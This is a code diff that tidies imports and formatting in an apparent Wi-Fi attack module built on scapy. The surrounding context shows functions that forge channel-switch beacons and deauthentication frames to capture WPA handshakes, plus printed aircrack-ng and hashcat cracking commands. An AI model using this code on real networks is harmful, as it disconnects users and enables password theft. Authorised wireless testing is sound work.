@@ -51,8 +51,6 @@ References:
 from __future__ import annotations
 
 import logging
-import os
-import re
 import struct
 import subprocess
 import threading
@@ -61,8 +59,15 @@ from pathlib import Path
 from typing import Dict, List, Optional, Set, Tuple
 
 from wirelessxpl.core.exploit import (
-    Exploit, OptBool, OptInteger, OptString,
-    print_error, print_info, print_status, print_success, print_warning,
+    Exploit,
+    OptBool,
+    OptInteger,
+    OptString,
+    print_error,
+    print_info,
+    print_status,
+    print_success,
+    print_warning,
 )
 from wirelessxpl.core.os_guard import OSRequirement, requires_os
 from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab
@@ -74,11 +79,23 @@ logger = logging.getLogger(__name__)
 # ---------------------------------------------------------------------------
 try:
     from scapy.all import (
-        RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltCSA,
-        Dot11Deauth, Dot11QoS, Dot11Auth, Dot11AssoReq,
-        Dot11Action, Dot11SpectrumManagement, Dot11CSA,
-        EAPOL, Raw,
-        sendp, sniff, wrpcap,
+        EAPOL,
+        Dot11,
+        Dot11Action,
+        Dot11AssoReq,
+        Dot11Auth,
+        Dot11Beacon,
+        Dot11CSA,
+        Dot11Deauth,
+        Dot11Elt,
+        Dot11EltCSA,
+        Dot11QoS,
+        Dot11SpectrumManagement,
+        RadioTap,
+        Raw,
+        sendp,
+        sniff,
+        wrpcap,
     )
     _SCAPY_OK = True
 except ImportError:
@@ -120,7 +137,7 @@ def _pmf_status(beacon_pkt) -> Tuple[bool, bool]:
 def _parse_beacon(pkt) -> Optional[Dict]:
     """Extract AP info from a beacon frame."""
     try:
-        from scapy.all import Dot11Beacon, Dot11, Dot11Elt
+        from scapy.all import Dot11, Dot11Beacon, Dot11Elt
         if not pkt.haslayer(Dot11Beacon):
             return None
         bssid = pkt[Dot11].addr3
@@ -157,7 +174,7 @@ def _build_csa_beacon(
     target_mac: str = "ff:ff:ff:ff:ff:ff",
 ) -> object:
     """Clone AP beacon and inject CSA element (ID=37) pointing to fake_channel."""
-    from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11EltCSA, Raw
+    from scapy.all import Dot11, Dot11Beacon, Dot11Elt, Dot11EltCSA, RadioTap
     bssid = original_beacon[Dot11].addr3
     ssid, rates, rsn, ht_cap, ext_rates = b"", b"", b"", b"", b""
 
@@ -194,7 +211,7 @@ def _build_csa_beacon(
 
 def _build_qos_null(bssid: str, client_mac: str) -> object:
     """QoS Null Data frame FromDS=1, MoreData=1 — wakes sleeping clients."""
-    from scapy.all import RadioTap, Dot11, Dot11QoS
+    from scapy.all import Dot11, Dot11QoS, RadioTap
     # type=2 (data), subtype=12 (QoS Null)
     # FromDS=1 (2 in DS field), MoreData=1
     pkt = (
@@ -213,7 +230,7 @@ def _build_qos_null(bssid: str, client_mac: str) -> object:
 
 
 def _build_deauth(bssid: str, client: str, reason: int = 7) -> object:
-    from scapy.all import RadioTap, Dot11, Dot11Deauth
+    from scapy.all import Dot11, Dot11Deauth, RadioTap
     return (
         RadioTap()
         / Dot11(type=0, subtype=12, addr1=client, addr2=bssid, addr3=bssid)
@@ -641,7 +658,7 @@ class Exploit(Exploit):
             for client, path in captured.items():
                 print_success(f"  {client} → {path}")
                 print_info(f"  Crack: aircrack-ng {path} -w <wordlist>")
-                print_info(f"         hashcat -m 22000 <hash> <wordlist>")
+                print_info("         hashcat -m 22000 <hash> <wordlist>")
         else:
             print_warning(
                 "No complete handshake captured this run.\n"
